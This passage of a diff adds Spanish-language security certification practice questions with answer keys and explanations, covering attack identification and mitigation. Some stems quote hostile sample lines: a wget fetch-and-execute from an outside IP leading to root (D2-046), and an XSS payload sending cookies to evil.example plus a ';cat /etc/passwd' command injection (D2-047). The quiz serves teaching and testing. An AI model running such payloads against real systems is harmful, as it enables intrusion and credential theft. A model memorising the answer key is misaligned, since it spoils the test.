+    "explanation": "Un rootkit opera con privilegios elevados (a menudo en el kernel) y modifica el sistema para ocultar procesos, archivos y conexiones a las herramientas locales; por eso solo se detecta mediante análisis sin conexión. Un keylogger captura pulsaciones, el bloatware es software innecesario preinstalado y una logic bomb espera una condición."
+  },
+  {
+    "id": "D2-038",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Varios usuarios reportan que `www.banco-ejemplo.com` los lleva a una página de inicio de sesión sospechosa. Desde el DNS interno se obtiene:\n```\n> nslookup www.banco-ejemplo.com 10.0.0.53\nName:    www.banco-ejemplo.com\nAddress: 198.51.100.66   (TTL 604800)\n> nslookup www.banco-ejemplo.com 8.8.8.8\nAddress: 203.0.113.10\n```\n¿Qué ataque es el MÁS probable?",
+    "options": [
+      "Credential replay",
+      "DNS cache poisoning",
+      "Typosquatting",
+      "Reflected DDoS"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "El servidor DNS interno devuelve una IP distinta a la autoritativa, con un TTL inusualmente largo, para el dominio correcto: su caché fue envenenada. Typosquatting requiere que el usuario escriba mal el dominio; aquí el dominio es correcto. Un DDoS reflejado y un credential replay no alteran la resolución de nombres."
+  },
+  {
+    "id": "D2-039",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 3,
+    "stem": "El enlace a Internet de una empresa se satura. La captura muestra:\n```\nsrc=<miles de IPs de resolvers abiertos>:53 -> dst=203.0.113.20  UDP  len=3,980\n(Sin consultas DNS salientes previas desde 203.0.113.20)\n```\nLos análisis indican que se enviaron consultas de ~60 bytes con la IP de la víctima falsificada como origen. ¿Qué ataque describe MEJOR esta actividad?",
+    "options": [
+      "Ataque de inundación SYN directo desde una botnet",
+      "On-path attack",
+      "DDoS amplificado y reflejado mediante DNS",
+      "DNS cache poisoning"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "Los atacantes falsifican la IP de la víctima en consultas pequeñas a resolvers abiertos, que responden con paquetes mucho mayores hacia la víctima: reflexión (terceros envían el tráfico) más amplificación (factor ~66x). No se altera la caché DNS, no hay interceptación del tráfico y no es un SYN flood directo, ya que el tráfico es UDP/53 desde resolvers."
+  },
+  {
+    "id": "D2-040",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Un usuario se queja de lentitud. Al ejecutar `arp -a` en su equipo se observa:\n```\n192.168.1.1     00-1a-2b-3c-4d-5e   dynamic\n192.168.1.45    00-1a-2b-3c-4d-5e   dynamic\n```\nLa puerta de enlace legítima tiene la MAC 00-50-56-aa-bb-01. ¿Qué ataque es el MÁS probable?",
+    "options": [
+      "DNS cache poisoning",
+      "Replay attack",
+      "Amplified DDoS",
+      "On-path attack mediante ARP poisoning"
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "La IP de la puerta de enlace está asociada a la MAC de otro host (192.168.1.45), lo que indica ARP poisoning para colocarse en medio de la comunicación (on-path). El DNS no está involucrado, un replay reenvía tráfico capturado y un DDoS no altera la tabla ARP."
+  },
+  {
+    "id": "D2-041",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Un cliente y un servidor admiten TLS 1.3, pero la captura de tráfico en una red de hotel muestra que la sesión se negoció con un protocolo obsoleto y un cifrado débil después de que un tercero modificara los mensajes de handshake. ¿Qué ataque criptográfico ocurrió?",
+    "options": [
+      "Birthday attack",
+      "Collision attack",
+      "Password spraying",
+      "Downgrade attack"
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Un downgrade attack obliga a las partes a usar una versión o un cifrado más débil del que ambas soportan, para facilitar su ruptura. Collision y birthday atacan funciones hash, y password spraying es un ataque a contraseñas."
+  },
+  {
+    "id": "D2-042",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 3,
+    "stem": "Un atacante prepara dos contratos PDF diferentes que generan el mismo hash MD5. Consigue que la víctima firme digitalmente el contrato inofensivo y luego sustituye el documento por el malicioso, que conserva una firma válida. ¿Qué ataque se realizó?",
+    "options": [
+      "Replay attack",
+      "Collision attack",
+      "Downgrade attack",
+      "Brute force attack"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "Un collision attack encuentra dos entradas distintas que producen el mismo hash, lo que permite que una firma creada para un documento valide otro. No se fuerza un protocolo más débil (downgrade), no se reenvía tráfico capturado (replay) ni se prueban contraseñas (brute force)."
+  },
+  {
+    "id": "D2-043",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Una empleada está de vacaciones en otro país y conserva su tarjeta de proximidad. Sin embargo, el sistema de control de acceso registra su credencial abriendo la puerta del centro de datos el domingo a las 02:14. Dos semanas antes, asistió a una conferencia donde alguien se le acercó con una mochila voluminosa. ¿Qué ataque es el MÁS probable?",
+    "options": [
+      "RFID cloning",
+      "Credential replay de hashes NTLM",
+      "Environmental attack",
+      "Brute force"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "Los lectores RFID ocultos pueden leer y copiar tarjetas de proximidad a corta distancia; el uso simultáneo de la credencial mientras la tarjeta original sigue con la empleada indica clonación. No hay intentos repetidos (brute force), ni hashes de red, ni manipulación de condiciones ambientales."
+  },
+  {
+    "id": "D2-044",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Tras comprometer una estación de trabajo, el atacante extrae hashes NTLM de la memoria con una herramienta como Mimikatz y, sin descifrarlos, los usa para autenticarse en servidores de archivos como administrador del dominio. ¿Qué ataque describe MEJOR esta actividad?",
+    "options": [
+      "Downgrade attack",
+      "Brute force",
+      "Birthday attack",
+      "Credential replay (pass-the-hash)"
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Reutilizar un hash o credencial capturada para autenticarse sin conocer la contraseña es credential replay (pass-the-hash). No se prueban contraseñas (brute force), no se buscan colisiones de hash (birthday) ni se fuerza un protocolo más débil (downgrade)."
+  },
+  {
+    "id": "D2-045",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Durante la investigación de un incidente, el SIEM no tiene eventos del controlador de dominio DC01 entre las 01:10 y las 03:45. El primer evento después de ese intervalo es:\n```\nEvent ID 1102  The audit log was cleared.  Account: svc_backup\n```\n¿Qué indicador de actividad maliciosa es el MÁS evidente?",
+    "options": [
+      "Blocked content",
+      "Resource consumption",
+      "Out-of-cycle logging",
+      "Missing logs"
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Un vacío en los registros y el evento 1102 (log de auditoría borrado) indican que el atacante eliminó evidencia: missing logs. Out-of-cycle logging se refiere a eventos registrados en momentos inusuales, no a su ausencia; no hay contenido bloqueado ni consumo anómalo de recursos."
+  },
+  {
+    "id": "D2-046",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "En un servidor web Linux se encuentra el siguiente historial de comandos de la cuenta del servicio web:\n```\nwww-data$ wget http://198.51.100.9/x -O /tmp/x\nwww-data$ chmod +x /tmp/x && /tmp/x\n# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n¿Qué ataque ocurrió?",
+    "options": [
+      "Downgrade attack",
+      "Credential replay",
+      "Privilege escalation",
+      "Directory traversal"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "La cuenta sin privilegios `www-data` ejecutó un exploit y obtuvo un shell con uid=0 (root): privilege escalation. No hay manipulación de rutas con `../`, ni reutilización de credenciales capturadas, ni negociación de protocolos más débiles."
+  },
+  {
+    "id": "D2-047",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "multi",
+    "difficulty": 3,
+    "stem": "Los registros de una aplicación web interna muestran:\n```\n10.0.5.23 \"GET /buscar?q=<script>fetch('//evil.example/?c='+document.cookie)</script>\" 200\n10.0.5.23 \"GET /diagnostico/ping?host=8.8.8.8;cat%20/etc/passwd\" 200\n```\n¿Qué DOS ataques se están intentando? (Elige DOS.)",
+    "options": [
+      "Command injection",
+      "SQL injection",
+      "Directory traversal",
+      "Cross-site scripting (XSS)",
+      "Cross-site request forgery (CSRF)",
+      "Replay attack"
+    ],
+    "answer": [
+      0,
+      3
+    ],
+    "explanation": "La primera solicitud inyecta un `<script>` para robar cookies (XSS). La segunda encadena con `;` un comando del sistema operativo al parámetro `host` (command injection). Aunque aparece `/etc/passwd`, no hay secuencias `../`, por lo que no es directory traversal; tampoco hay sintaxis SQL, solicitudes forzadas ni tráfico reenviado."
+  },
+  {
+    "id": "D2-048",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "multi",
+    "difficulty": 3,
+    "stem": "Un analista del SOC observa en un servidor de archivos: CPU al 98 %, miles de escrituras de disco por minuto y archivos renombrados como `presupuesto.xlsx.lckd`. Los usuarios reportan que no pueden abrir sus documentos en la unidad compartida. ¿Qué DOS indicadores de actividad maliciosa están presentes? (Elige DOS.)",
+    "options": [
+      "Account lockout",
+      "Resource inaccessibility",
+      "Concurrent session usage",
+      "Impossible travel",
+      "Published/documented",
+      "Resource consumption"
+    ],
+    "answer": [
+      1,
+      5
+    ],
+    "explanation": "El uso extremo de CPU y disco es resource consumption, y la imposibilidad de abrir los archivos cifrados es resource inaccessibility, ambos típicos de ransomware. No hay datos de ubicación de inicio de sesión, sesiones simultáneas, publicaciones externas ni bloqueos de cuentas."
+  },
+  {
+    "id": "D2-049",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "match",
+    "difficulty": 2,
+    "stem": "Empareja cada descripción con el tipo de malware que MEJOR le corresponde.",
+    "items": [
+      "Supervisa la navegación y recopila información personal del usuario sin su consentimiento para enviarla a terceros.",
+      "Una \"calculadora gratuita\" funciona correctamente, pero además instala una puerta trasera.",
+      "Aplicaciones preinstaladas por el fabricante que consumen recursos y que el usuario no necesita.",
+      "Registra cada pulsación de teclado y envía el contenido cada hora a un servidor externo.",
+      "Código que se adjunta a ejecutables y se propaga cuando el usuario ejecuta el archivo infectado.",
+      "Se propaga solo por la red explotando una vulnerabilidad de SMB, sin interacción del usuario."
+    ],
+    "choices": [
+      "Trojan",
+      "Virus",
+      "Worm",
+      "Keylogger",
+      "Bloatware",
+      "Spyware"
+    ],
+    "answer": [
+      5,
+      0,
+      4,
+      3,
+      1,
+      2
+    ],
+    "explanation": "El trojan se disfraza de software legítimo; el virus requiere que el usuario ejecute el archivo infectado; el worm se autopropaga por la red; el keylogger captura pulsaciones; el bloatware es software innecesario preinstalado; y el spyware recopila información del usuario sin su consentimiento."
+  },
+  {
+    "id": "D2-050",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "match",
+    "difficulty": 3,
+    "stem": "Empareja cada observación con el indicador de actividad maliciosa correspondiente.",
+    "items": [
+      "Los usuarios no pueden acceder a un servidor de archivos que dejó de responder.",
+      "La misma cuenta mantiene dos sesiones VPN activas al mismo tiempo desde equipos distintos.",
+      "Aparecen registros de instalación de software a las 03:00 de un domingo, fuera de cualquier ventana de cambios.",
+      "El proxy rechaza para varios usuarios las descargas de un dominio clasificado como malware.",
+      "Un usuario no puede iniciar sesión porque su cuenta quedó bloqueada, aunque no ha intentado autenticarse.",
+      "Un investigador publica en su blog que credenciales de la empresa aparecen en un volcado reciente."
+    ],
+    "choices": [
+      "Account lockout",
+      "Concurrent session usage",
+      "Blocked content",
+      "Out-of-cycle logging",
+      "Published/documented",
+      "Resource inaccessibility"
+    ],
+    "answer": [
+      5,
+      1,
+      3,
+      2,
+      0,
+      4
+    ],
+    "explanation": "Un bloqueo sin intentos legítimos sugiere ataques de contraseña (account lockout); dos sesiones simultáneas de la misma cuenta es concurrent session usage; el rechazo del proxy es blocked content; la actividad registrada fuera de horario o de ciclo es out-of-cycle logging; la información divulgada por terceros es published/documented; y un servicio inaccesible es resource inaccessibility."
+  },
+  {
+    "id": "D2-051",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "El WIDS de la empresa genera estas alertas en la misma área:\n```\nSSID \"Corp-WiFi\"  BSSID 00:11:22:33:44:55  canal 6   (registrado)\nSSID \"Corp-WiFi\"  BSSID 7a:3f:91:0c:de:21  canal 11  señal -32 dBm (no registrado)\nDeauthentication frames x 4,500 -> broadcast  (origen 00:11:22:33:44:55, falsificado)\n```\n¿Qué ataque es el MÁS probable?",
+    "options": [
+      "RFID cloning",
+      "DDoS amplificado mediante DNS",
+      "Evil twin",
+      "Bluejacking"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "Un AP no autorizado que anuncia el mismo SSID con señal más fuerte, junto con tramas de deautenticación falsificadas que desconectan a los clientes del AP legítimo, es un ataque evil twin para capturar tráfico o credenciales. Bluejacking usa Bluetooth, RFID cloning copia tarjetas de proximidad y la amplificación DNS satura enlaces."
+  },
+  {
+    "id": "D2-052",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "match",
+    "difficulty": 3,
+    "stem": "Empareja cada observación con el ataque que MEJOR la describe.",
+    "items": [
+      "Un atacante captura un token de autenticación válido en tránsito y lo retransmite más tarde, sin modificarlo, para obtener acceso.",
+      "El log muestra 25,000 intentos fallidos contra la cuenta \"administrador\" desde una sola IP en 10 minutos, probando palabras de un diccionario.",
+      "Un atacante genera millones de mensajes buscando dos con el mismo hash truncado a 32 bits, aprovechando que la probabilidad de coincidencia crece mucho más rápido que el número de intentos.",
+      "Una solicitud HTTP lleva un encabezado User-Agent con 8,000 caracteres \"AAAA…\" seguidos de bytes no imprimibles, y el servicio se reinicia.",
+      "Un intruso desactiva el aire acondicionado del centro de datos hasta que los servidores se apagan por sobrecalentamiento."
+    ],
+    "choices": [
+      "Brute force",
+      "Replay",
+      "Environmental",
+      "Buffer overflow",
+      "Birthday",
+      "Password spraying"
+    ],
+    "answer": [
+      1,
+      0,
+      4,
+      3,
+      2
+    ],
+    "explanation": "Muchas contraseñas contra una sola cuenta es brute force (spraying sería una contraseña contra muchas cuentas); retransmitir un token capturado es replay; manipular la climatización es un ataque físico environmental; una entrada sobredimensionada con bytes no imprimibles que provoca la caída del servicio indica buffer overflow; y buscar colisiones aprovechando la paradoja del cumpleaños es un birthday attack."
+  },
+  {
+    "id": "D2-053",
+    "domain": 2,
+    "objective": "2.5",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "Una empresa quiere asegurar que en las estaciones de trabajo de contabilidad solo puedan ejecutarse los programas aprobados y que cualquier otro ejecutable sea bloqueado por defecto. ¿Qué técnica de mitigación cumple MEJOR este requisito?",
+    "options": [
+      "Application allow list",
+      "Host-based firewall",
+      "Full-disk encryption",
+      "Application block list"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "Una allow list permite únicamente el software aprobado y bloquea todo lo demás por defecto. Una block list solo bloquea lo que ya se conoce como malo, el firewall de host controla tráfico de red y el cifrado de disco protege datos en reposo, no la ejecución de programas."
+  },
+  {
+    "id": "D2-054",
+    "domain": 2,
+    "objective": "2.5",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Una empresa instala sensores IoT de climatización que tienen un firmware con poco soporte. Desea impedir que, si uno se ve comprometido, el atacante alcance los servidores de producción. ¿Qué mitigación es la MEJOR?",
+    "options": [
+      "Decomisionar todos los servidores de producción",
+      "Cifrar los discos de los servidores de producción",
+      "Colocar los sensores en una VLAN o segmento separado con reglas que solo permitan la comunicación con su servidor de gestión",
+      "Aplicar least privilege a las cuentas de los usuarios de climatización"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "La segmentación limita el movimiento lateral desde dispositivos de menor confianza hacia sistemas críticos. Decomisionar los servidores de producción no es viable, el cifrado en reposo no impide el acceso por red, y least privilege sobre cuentas de usuario no restringe el tráfico de los dispositivos."
+  },
+  {
+    "id": "D2-055",
+    "domain": 2,
+    "objective": "2.5",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "El EDR detecta comportamiento de ransomware en un portátil que está cifrando archivos de una unidad de red compartida. ¿Qué debe hacer PRIMERO el analista para limitar el daño?",
+    "options": [
+      "Aislar el equipo de la red mediante la función de contención del EDR",
+      "Restaurar los archivos de la unidad compartida desde el respaldo",
+      "Aplicar todos los parches pendientes del sistema operativo",
+      "Reinstalar el sistema operativo del portátil"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "La isolation del host detiene de inmediato la propagación y el cifrado de recursos de red, a la vez que conserva evidencia. Parchear no detiene un ataque en curso; restaurar antes de contener provocaría que los archivos se cifraran de nuevo; reinstalar destruye evidencia y no es el primer paso."
+  },
+  {
+    "id": "D2-056",
+    "domain": 2,
+    "objective": "2.5",
+    "type": "single",
+    "difficulty": 3,
+    "stem": "La cuenta de servicio de la aplicación de respaldos es miembro de Domain Admins \"porque así lo recomendó el instalador\". La aplicación solo necesita leer los archivos de los servidores y escribir en el repositorio de respaldos. ¿Qué acción reduce MEJOR el riesgo?",
+    "options": [
+      "Rotar la contraseña de la cuenta de servicio cada 30 días",
+      "Retirar la cuenta de Domain Admins y asignarle únicamente los derechos de respaldo y los permisos sobre el repositorio que necesita",
+      "Habilitar el monitoreo de los inicios de sesión de la cuenta en el SIEM",
+      "Cifrar el repositorio de respaldos con AES-256"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "Least privilege reduce el alcance del daño si la cuenta se ve comprometida, ya que solo conserva los derechos estrictamente necesarios. Rotar contraseñas y monitorear ayudan, pero la cuenta seguiría teniendo control total del dominio; el cifrado protege los respaldos, no limita los privilegios."
+  },
+  {
+    "id": "D2-057",
+    "domain": 2,
+    "objective": "2.5",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "Un servidor de archivos con datos de clientes será retirado definitivamente. ¿Qué acción garantiza MEJOR que no se expongan datos ni queden accesos residuales?",
+    "options": [
+      "Deshabilitar el antivirus para acelerar el apagado final",
+      "Sanitizar o destruir los discos según el procedimiento y eliminar sus cuentas, registros DNS y reglas de firewall asociadas",
+      "Hacer un formateo rápido de los discos y donar el equipo",
+      "Desconectarlo de la red y guardarlo en la bodega de TI"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "Un decommissioning adecuado incluye sanitizar o destruir los medios y eliminar las referencias del activo (cuentas, DNS, reglas e inventario). Guardarlo deja datos recuperables, un formateo rápido no borra los datos de forma segura y deshabilitar el antivirus no aporta nada a la seguridad."
+  },
+  {
+    "id": "D2-058",
+    "domain": 2,
+    "objective": "2.5",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Un equipo de seguridad descubre que los usuarios cambian con frecuencia la configuración de sus estaciones (desactivan el bloqueo de pantalla y habilitan servicios). Quiere que la línea base segura se aplique automáticamente y que cualquier desviación se corrija sin intervención manual. ¿Qué técnica de mitigación aplica?",
+    "options": [
+      "Decommissioning",
+      "Encryption",
+      "Isolation",
+      "Configuration enforcement"
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Configuration enforcement usa herramientas como GPO, MDM o gestión de configuración para aplicar y mantener una línea base, corrigiendo las desviaciones. Decommissioning retira activos, isolation contiene equipos comprometidos y el cifrado protege la confidencialidad de los datos."
+  },
+  {
+    "id": "D2-059",
+    "domain": 2,
+    "objective": "2.5",
+    "type": "multi",
+    "difficulty": 1,
+    "stem": "Un administrador prepara un nuevo servidor web Linux para producción. ¿Qué acciones de hardening debe realizar? (Elige TRES.)",
+    "options": [
+      "Cambiar las contraseñas predeterminadas de todas las cuentas y servicios",
+      "Desinstalar el software innecesario incluido en la imagen base",
+      "Habilitar Telnet para facilitar la administración remota",
+      "Otorgar privilegios sudo a todos los usuarios del sistema",
+      "Deshabilitar los servicios y puertos que el servidor no necesita",
+      "Desactivar el firewall basado en host para mejorar el rendimiento"
+    ],
+    "answer": [
+      0,
+      1,
+      4
+    ],
+    "explanation": "El hardening reduce la superficie de ataque al deshabilitar puertos y protocolos innecesarios, cambiar las contraseñas predeterminadas y eliminar software que no se usa. Telnet transmite en texto claro, el sudo generalizado viola el principio de least privilege y desactivar el firewall de host elimina una capa de defensa."
+  },
+  {
+    "id": "D2-060",
+    "domain": 2,
+    "objective": "2.5",
+    "type": "multi",
+    "difficulty": 3,
+    "stem": "Una empresa necesita en sus endpoints: (1) identificar actividad maliciosa por su comportamiento, recopilar telemetría continua y, desde la consola central, terminar procesos o poner el equipo en cuarentena; y (2) filtrar en cada equipo, de forma local, las conexiones entrantes a puertos no autorizados. ¿Qué DOS controles cumplen MEJOR estos requisitos? (Elige DOS.)",
+    "options": [
+      "Host-based firewall",
+      "Application block list",
+      "Data loss prevention (DLP)",
+      "Endpoint detection and response (EDR)",
+      "Full-disk encryption",
+      "Decommissioning"
+    ],
+    "answer": [
+      0,
+      3
+    ],
+    "explanation": "EDR proporciona detección por comportamiento, telemetría y respuesta remota (matar procesos, aislar el equipo), y el host-based firewall filtra el tráfico entrante y saliente en cada equipo. El cifrado de disco protege datos en reposo, DLP evita fugas de información, la block list solo bloquea software conocido y decommissioning retira activos."
+  },
+  {
+    "id": "D2-061",
+    "domain": 2,
+    "objective": "2.5",
+    "type": "multi",
+    "difficulty": 2,
+    "stem": "Un sistema SCADA heredado controla una línea de producción crítica. El fabricante cerró y no existen parches; reemplazarlo tomará 18 meses. ¿Qué DOS mitigaciones son las MÁS adecuadas mientras tanto? (Elige DOS.)",
+    "options": [
+      "Permitir el acceso remoto directo desde Internet para el personal de mantenimiento",
+      "Conservar las credenciales predeterminadas para facilitar el soporte técnico",
+      "Deshabilitar el registro de eventos para reducir la carga del sistema",
+      "Monitorear continuamente el tráfico y los eventos del sistema para detectar anomalías",
+      "Aislarlo en un segmento de red dedicado con reglas que solo permitan el tráfico estrictamente necesario",
+      "Aplicar los parches más recientes publicados por el fabricante"
+    ],
+    "answer": [
+      3,
+      4
+    ],
+    "explanation": "Cuando no es posible parchear, la segmentación y el monitoreo actúan como controles compensatorios que limitan la exposición y permiten detectar abusos. No hay parches disponibles, las credenciales predeterminadas y el acceso directo desde Internet amplían la superficie de ataque, y desactivar los logs elimina la capacidad de detección."
+  },
+  {
+    "id": "D2-062",
+    "domain": 2,
+    "objective": "2.5",
+    "type": "match",
+    "difficulty": 2,
+    "stem": "Empareja cada acción con la técnica de mitigación que representa.",
+    "items": [
+      "Enviar los registros de firewalls y servidores al SIEM y configurar alertas.",
+      "Instalar la actualización del fabricante que corrige una vulnerabilidad crítica recién publicada.",
+      "Separar la red de puntos de venta del resto de la red corporativa en VLAN distintas con un firewall entre ellas.",
+      "Retirar un servidor obsoleto: borrar sus discos de forma segura y eliminarlo del inventario y del DNS.",
+      "Configurar en una carpeta compartida qué grupos pueden leer y cuáles pueden modificar su contenido.",
+      "Proteger los datos de los portátiles para que sean ilegibles si el equipo es robado."
+    ],
+    "choices": [
+      "Patching",
+      "Encryption",
+      "Access control (ACL/permissions)",
+      "Monitoring",
+      "Segmentation",
+      "Decommissioning"
+    ],
+    "answer": [
+      3,
+      0,
+      4,
+      5,
+      2,
+      1
+    ],
+    "explanation": "Aplicar actualizaciones es patching; hacer ilegibles los datos robados es encryption; definir quién puede leer o modificar es access control mediante ACL y permisos; centralizar logs y alertas es monitoring; separar redes por zonas es segmentation; y retirar un activo de forma segura es decommissioning."
+  }
+]
